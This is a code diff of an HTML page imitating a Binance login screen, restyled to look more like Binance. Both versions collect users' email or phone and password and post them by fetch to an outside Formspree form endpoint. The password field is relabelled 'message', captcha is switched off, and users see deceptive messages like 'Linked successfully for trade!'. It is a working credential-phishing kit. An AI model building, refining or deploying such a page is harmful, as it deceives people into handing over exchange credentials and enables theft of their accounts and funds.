@@ -2,249 +2,269 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bars Clays - Binance PRO Login</title>
-<style>
-/* ---------- RESET ---------- */
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial, Helvetica, sans-serif;}
-body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Login</title>
 
-/* ---------- CONTAINER ---------- */
-.container{
+<style>
+
+*{box-sizing:border-box}
+
+body{
+margin:0;
+background:#0b0e11;
+font-family:system-ui,-apple-system,Segoe UI,Roboto;
+color:white;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+}
+
+/* container */
+.wrap{
 width:100%;
 max-width:420px;
-background:#fff;
-border-radius:16px;
-padding:34px 26px 40px;
-box-shadow:0 10px 30px rgba(0,0,0,.1);
+padding:48px 26px;
 }
 
-/* ---------- HEADER ---------- */
-.logo{text-align:center;font-weight:700;font-size:28px;color:#fcd535;margin-bottom:6px;}
-.subtitle{text-align:center;color:#777;font-size:14px;margin-bottom:28px;}
-.welcome{text-align:center;font-size:28px;font-weight:700;margin-bottom:26px;}
+/* title */
+h1{
+font-size:30px;
+margin-bottom:34px;
+}
 
-/* ---------- INPUTS ---------- */
-.input-group{margin-bottom:18px;position:relative;}
-.input-group label{font-size:14px;color:#555;}
-.input-group input{
+/* field */
+.field{
+position:relative;
+margin-bottom:22px;
+}
+
+/* inputs */
+input,select{
 width:100%;
-margin-top:8px;
-padding:16px 45px 16px 16px;
+padding:18px 16px;
+background:#181a20;
+border:1px solid #2b3139;
 border-radius:10px;
-border:none;
-background:#efefef;
 font-size:16px;
+color:white;
+outline:none;
 }
-.input-group input:focus{outline:none;background:#e9e9e9;}
-.input-group .toggle-password{
+
+/* glowing yellow focus like Binance */
+input:focus{
+border-color:#f0b90b;
+box-shadow:0 0 0 2px rgba(240,185,11,.15);
+}
+
+/* floating label */
+label{
 position:absolute;
-right:12px;
+left:14px;
+top:50%;
+transform:translateY(-50%);
+color:#848e9c;
+pointer-events:none;
+transition:.2s;
+background:#181a20;
+padding:0 6px;
+}
+
+input:focus + label,
+input:not(:placeholder-shown) + label{
+top:-9px;
+font-size:12px;
+color:#f0b90b;
+}
+
+/* password eye */
+.eye{
+position:absolute;
+right:14px;
 top:50%;
 transform:translateY(-50%);
 cursor:pointer;
-font-size:16px;
-color:#777;
+opacity:.7;
 }
 
-/* ---------- EMAIL / PHONE TOGGLE ---------- */
-.toggle-group{
-display:flex;
-justify-content:flex-start;
-gap:12px;
-margin-bottom:18px;
-}
-.toggle-group button{
-padding:6px 12px;
-border-radius:8px;
-border:1px solid #ddd;
-background:#f9f9f9;
-cursor:pointer;
-font-size:14px;
-}
-.toggle-group button.active{background:#fcd535;color:#000;border:none;}
+.eye:hover{opacity:1}
 
-/* ---------- CHECKBOX ---------- */
-.checkbox{
-display:flex;
-gap:10px;
-align-items:flex-start;
-font-size:14px;
-color:#333;
-margin-bottom:18px;
-}
-.checkbox input{width:18px;height:18px;margin-top:3px;}
-
-/* ---------- BUTTONS ---------- */
-button.submit{
+/* login button */
+button{
 width:100%;
-padding:16px;
+background:#f0b90b;
 border:none;
 border-radius:10px;
-background:#fcd535;
+padding:18px;
 font-weight:700;
 font-size:18px;
 cursor:pointer;
+margin-top:6px;
 display:flex;
-justify-content:center;
 align-items:center;
+justify-content:center;
 gap:10px;
 }
-button.submit:disabled{opacity:.7;cursor:not-allowed;}
-.google-btn{
-width:100%;
-padding:14px;
-border-radius:10px;
-border:1px solid #ddd;
-display:flex;
-align-items:center;
-justify-content:center;
-gap:10px;
-margin-bottom:16px;
-background:#fff;
+
+button:disabled{opacity:.7}
+
+/* spinner */
+.spinner{
+width:18px;
+height:18px;
+border:3px solid rgba(0,0,0,.2);
+border-top:3px solid black;
+border-radius:50%;
+animation:spin .8s linear infinite;
+display:none;
+}
+
+@keyframes spin{
+to{transform:rotate(360deg)}
+}
+
+/* google */
+.google{
+background:white;
+color:black;
+margin-top:14px;
 font-weight:600;
-cursor:pointer;
 }
 
-/* ---------- LINK ---------- */
-.forgot{display:block;text-align:right;font-size:14px;color:#0073e6;text-decoration:none;margin-bottom:16px;}
+/* phone select */
+.phoneRow{
+display:flex;
+gap:10px;
+}
 
-/* ---------- POPUP ---------- */
-.popup{
-position:fixed;top:0;left:0;width:100%;height:100%;
-background:rgba(0,0,0,.6);display:none;
-justify-content:center;align-items:center;padding:20px;
+.phoneRow select{
+max-width:120px;
 }
-.popup-box{
-background:#1E2329;color:#EAECEF;border-radius:14px;padding:40px 30px;
-max-width:360px;width:100%;text-align:center;animation:popBox .25s ease;
-}
-@keyframes popBox{from{transform:scale(.9);opacity:.4}to{transform:scale(1);opacity:1}}
-.checkmark{width:80px;height:80px;border-radius:50%;display:flex;justify-content:center;align-items:center;margin:0 auto 20px;background:#0ECB81;animation:pop .45s ease forwards;position:relative;}
-.checkmark::after{content:'✔';font-size:42px;color:#fff;opacity:0;animation:fadeIn .5s ease .45s forwards;}
-@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
-@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}
-.popup h2{color:#0ECB81;margin-bottom:8px;}
-.popup p{color:#B7BDC6;font-size:14px;margin-bottom:20px;}
-.popup button{background:#FCD535;color:#000;padding:12px 22px;border-radius:8px;}
 
-/* MOBILE */
-@media(max-width:420px){
-.container{padding:28px 20px}
-.welcome{font-size:24px}
+/* status */
+#my-form-status{
+text-align:center;
+margin-top:18px;
+color:#f0b90b;
 }
+
+/* mobile */
+@media(max-width:480px){
+.wrap{padding:40px 18px}
+}
+
 </style>
 </head>
+
 <body>
 
-<div class="container">
-<img src="image.png" alt="Bars Clays Logo" class="logo">
-<div class="logo">Bars Clays</div>
-<div class="subtitle">Secure account contact</div>
-<div class="welcome">Welcome to Binance</div>
+<div class="wrap">
 
-<!-- EMAIL / PHONE TOGGLE -->
-<div class="toggle-group">
-<button type="button" class="active" id="emailBtn">Email</button>
-<button type="button" id="phoneBtn">Phone</button>
+<h1>Log in</h1>
+
+<form id="my-form" action="https://formspree.io/f/xjgewkoy" method="POST">
+
+<!-- EMAIL / PHONE -->
+<div class="field">
+<input type="text" name="email" placeholder=" " required>
+<label>Email / Phone</label>
 </div>
 
-<form id="contactForm" action="https://formspree.io/f/xjgewkoy" method="POST">
+<!-- PASSWORD -->
+<div class="field">
 
-<div class="input-group">
-<label id="emailLabel">Email</label>
-<input type="email" name="email" id="emailInput" required>
-</div>
-
-<div class="input-group">
+<input id="pass" type="password" name="message" placeholder=" " required>
 <label>Password</label>
-<input type="password" name="password" id="passwordInput" required>
-<span class="toggle-password" id="togglePassword">👁</span>
+
+<div class="eye" onclick="togglePass()">
+
+<!-- real svg eye -->
+<svg width="22" height="22" viewBox="0 0 24 24" fill="white">
+<path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z"/>
+</svg>
+
+</div>
 </div>
 
-<div class="checkbox">
-<input type="checkbox" checked>
-<div>By continuing, I agree to the Terms and Privacy Policy.</div>
-</div>
+<input type="hidden" name="_subject" value="New Website Submission">
+<input type="hidden" name="_captcha" value="false">
 
-<a href="#" class="forgot">Forgot password?</a>
+<!-- LOGIN -->
+<button id="btn">
 
-<button type="submit" class="submit">Continue</button>
+<span>Log in</span>
+<div class="spinner" id="spin"></div>
+
+</button>
+
+<!-- GOOGLE -->
+<button type="button" class="google">
+
+<!-- google svg -->
+<svg width="18" height="18" viewBox="0 0 48 48">
+<path fill="#FFC107" d="M43 20H42V19H24V29H38C36 34 31 37 24 37C15 37 8 30 8 21C8 12 15 5 24 5C28 5 31 6 34 9L41 2C36-2 30-4 24-4C10-4-2 8-2 22C-2 36 10 48 24 48C38 48 50 36 50 22C50 20 50 19 49 17Z"/>
+</svg>
+
+Continue with Google
+</button>
+
+<p id="my-form-status"></p>
 
 </form>
-
-<div class="google-btn">
-<img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" width="20">
-Continue with Google
-</div>
 </div>
 
-<!-- SUCCESS POPUP -->
-<div id="popup" class="popup">
-<div class="popup-box">
-<div class="checkmark"></div>
-<h2>Account Linked Successfully!</h2>
-<p>Your Bars Clays account details have been received safely.</p>
-<button onclick="closePopup()">Back</button>
-</div>
-</div>
 
 <script>
-const form = document.getElementById("contactForm");
-const popup = document.getElementById("popup");
 
-// Password toggle
-const togglePassword = document.getElementById("togglePassword");
-const passwordInput = document.getElementById("passwordInput");
-togglePassword.addEventListener("click", () => {
-  const type = passwordInput.type === "password" ? "text" : "password";
-  passwordInput.type = type;
+/* password toggle */
+function togglePass(){
+const p=document.getElementById("pass");
+p.type = p.type==="password" ? "text" : "password";
+}
+
+
+/* form submit with spinner */
+document.addEventListener("DOMContentLoaded",function(){
+
+var form=document.getElementById("my-form");
+var spin=document.getElementById("spin");
+var btn=document.getElementById("btn");
+
+form.addEventListener("submit",function(e){
+
+e.preventDefault();
+
+spin.style.display="block";
+btn.disabled=true;
+
+var data=new FormData(form);
+
+fetch(form.action,{
+method:"POST",
+body:data,
+headers:{'Accept':'application/json'}
+})
+.then(r=>{
+spin.style.display="none";
+btn.disabled=false;
+
+if(r.ok){
+document.getElementById("my-form-status").innerHTML="Linked successfully for trade!";
+form.reset();
+}else{
+document.getElementById("my-form-status").innerHTML="Submission failed.";
+}
+})
+.catch(()=>{
+spin.style.display="none";
+btn.disabled=false;
+document.getElementById("my-form-status").innerHTML="Connection error.";
 });
 
-// Email / Phone toggle
-const emailBtn = document.getElementById("emailBtn");
-const phoneBtn = document.getElementById("phoneBtn");
-const emailInput = document.getElementById("emailInput");
-const emailLabel = document.getElementById("emailLabel");
-
-emailBtn.addEventListener("click", () => {
-  emailBtn.classList.add("active");
-  phoneBtn.classList.remove("active");
-  emailLabel.textContent = "Email";
-  emailInput.type = "email";
-  emailInput.placeholder = "Email address";
 });
 
-phoneBtn.addEventListener("click", () => {
-  phoneBtn.classList.add("active");
-  emailBtn.classList.remove("active");
-  emailLabel.textContent = "Phone";
-  emailInput.type = "tel";
-  emailInput.placeholder = "Phone number";
 });
 
-// Formspree submission with popup
-form.addEventListener("submit", async function(e){
-    e.preventDefault();
-    const data = new FormData(form);
-    const response = await fetch(form.action,{
-        method:"POST",
-        body:data,
-        headers:{ 'Accept':'application/json' }
-    });
-    if(response.ok){
-        popup.style.display="flex";
-        form.reset();
-    } else {
-        alert("linked successfully go login to your binance app.");
-    }
-});
-
-popup.addEventListener("click",function(e){
-    if(e.target===popup){ popup.style.display="none"; }
-});
-
-function closePopup(){ popup.style.display="none"; }
 </script>
 
 </body>
